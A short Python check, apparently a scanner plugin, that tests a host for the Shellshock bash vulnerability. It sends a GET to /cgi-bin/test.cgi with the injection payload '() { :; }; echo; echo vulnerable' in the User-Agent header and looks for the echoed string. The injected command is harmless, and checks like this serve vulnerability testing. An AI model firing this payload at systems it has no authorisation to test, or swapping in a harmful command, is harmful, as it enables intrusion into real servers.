import requests

tags = ["cve", "bash", "shellshock"]

def run(target):
    url = f"http://{target}/cgi-bin/test.cgi"
    headers = {
        "User-Agent": "() { :; }; echo; echo vulnerable"
    }
    try:
        r = requests.get(url, headers=headers, timeout=5)
        if "vulnerable" in r.text.lower():
            return f"[+] Shellshock vulnerable: {url}"
        return "[-] Not vulnerable to Shellshock."
    except Exception as e:
        return f"[!] Error: {e}"
